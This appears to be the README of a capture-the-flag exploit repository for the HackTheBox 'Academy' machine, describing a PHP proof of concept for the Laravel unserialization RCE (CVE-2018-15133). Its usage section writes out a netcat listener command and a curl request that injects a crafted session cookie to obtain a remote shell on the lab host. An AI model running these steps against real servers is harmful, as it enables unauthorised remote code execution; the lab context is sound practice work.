## About:
* **Platform**&nbsp;&nbsp;&nbsp;: HacTheBox
* **Challenge**&nbsp;: Academy
* **Difficulty**&nbsp;&nbsp;: Easy
* **Link**&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;: [https://app.hackthebox.com/machines/Academy](https://app.hackthebox.com/machines/Academy)

## Description:
This is a PHP POC for [Laravel unsafe unserialization](https://www.programmersought.com/article/29875427507/) RCE vulnerability identified as [CVE-2018-15133](https://nvd.nist.gov/vuln/detail/CVE-2018-15133)

## Reference:
[+] [https://www.truesec.com/hub/blog/from-s3-bucket-to-laravel-unserialize-rce](https://www.truesec.com/hub/blog/from-s3-bucket-to-laravel-unserialize-rce)

## Usage:
1. Start a netcat listener on a port number of your choice (e.g.; `9999`) 
```bash
$ nc -nlvp 9999
```
2. Run the following curl command:
```bash
curl -H "Cookie: laravel_session= $(php poc.php);" -v http://dev-staging-01.academy.htb
```
![2023-07-26 18_19_56-ParrotOS-HTB - VMware Workstation 17 Player (Non-commercial use only)](https://github.com/YounesTasra-R4z3rSw0rd/CTF-Scripts/assets/101610095/046a4e37-a707-419a-9e62-a98fb9aa15be)
